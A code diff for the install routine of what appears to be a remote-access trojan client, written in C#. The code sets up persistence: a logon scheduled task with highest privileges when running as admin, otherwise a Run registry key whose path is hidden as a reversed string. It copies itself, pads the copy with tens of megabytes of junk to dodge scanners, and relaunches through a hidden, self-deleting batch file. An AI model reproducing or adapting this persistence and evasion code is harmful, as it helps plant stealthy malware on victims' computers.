@@ -15,8 +15,8 @@ namespace Client.Install
         {
             try
             {
-                string installfullpath = Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile);
-                if (Process.GetCurrentProcess().MainModule.FileName != installfullpath)
+                FileInfo installPath = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile));
+                if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
                 {
 
                     for (int i = 0; i < 10; i++)
@@ -28,13 +28,10 @@ namespace Client.Install
                     {
                         try
                         {
-                            if (P.MainModule.FileName == installfullpath)
+                            if (P.MainModule.FileName == installPath.FullName)
                                 P.Kill();
                         }
-                        catch
-                        {
-                            Debug.WriteLine("NormalStartup Error : " + P.ProcessName);
-                        }
+                        catch { }
                     }
                     if (Methods.IsAdmin())
                     {
@@ -43,7 +40,7 @@ namespace Client.Install
                             StartInfo = new ProcessStartInfo
                             {
                                 FileName = "schtasks.exe",
-                                Arguments = "/create /f /sc ONLOGON /RL HIGHEST /tn " + @"""'" + Settings.InstallFile + @"""'" + " /tr " + @"""'" + installfullpath + @"""'",
+                                Arguments = "/create /f /sc ONLOGON /RL HIGHEST /tn " + @"""'" + Path.GetFileNameWithoutExtension(installPath.FullName) + @"""'" + " /tr " + @"""'" + installPath.FullName + @"""'",
                                 WindowStyle = ProcessWindowStyle.Hidden,
                                 CreateNoWindow = true,
                             }
@@ -54,17 +51,17 @@ namespace Client.Install
                     {
                         using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Strings.StrReverse(@"\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
                         {
-                            key.SetValue(Settings.InstallFile, "\"" + installfullpath + "\"");
+                            key.SetValue(Path.GetFileNameWithoutExtension(installPath.FullName), "\"" + installPath.FullName + "\"");
                         }
                     }
 
                     FileStream fs;
-                    if (File.Exists(installfullpath))
+                    if (File.Exists(installPath.FullName))
                     {
-                        File.Delete(installfullpath);
+                        File.Delete(installPath.FullName);
                         Thread.Sleep(1000);
                     }
-                    fs = new FileStream(installfullpath, FileMode.CreateNew);
+                    fs = new FileStream(installPath.FullName, FileMode.CreateNew);
                     byte[] clientExe = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
                     fs.Write(clientExe, 0, clientExe.Length);
                     byte[] junk = new byte[new Random().Next(40 * 1024 * 1000, 50 * 1024 * 1000)];
@@ -72,8 +69,24 @@ namespace Client.Install
                     fs.Write(junk, 0, junk.Length);
                     fs.Dispose();
 
-                    Process.Start(installfullpath);
                     Methods.ClientExit();
+                    string batch = Path.GetTempFileName() + ".bat";
+                    using (StreamWriter sw = new StreamWriter(batch))
+                    {
+                        sw.WriteLine("@echo off");
+                        sw.WriteLine("timeout 3 > NUL");
+                        sw.WriteLine("START " + "\"" + "\" " + "\"" + installPath.FullName + "\"");
+                        sw.WriteLine("CD " + Path.GetTempPath());
+                        sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
+                    }
+                    Process.Start(new ProcessStartInfo()
+                    {
+                        FileName = batch,
+                        CreateNoWindow = true,
+                        ErrorDialog = false,
+                        UseShellExecute = false,
+                        WindowStyle = ProcessWindowStyle.Hidden
+                    });
                     Environment.Exit(0);
                 }
             }
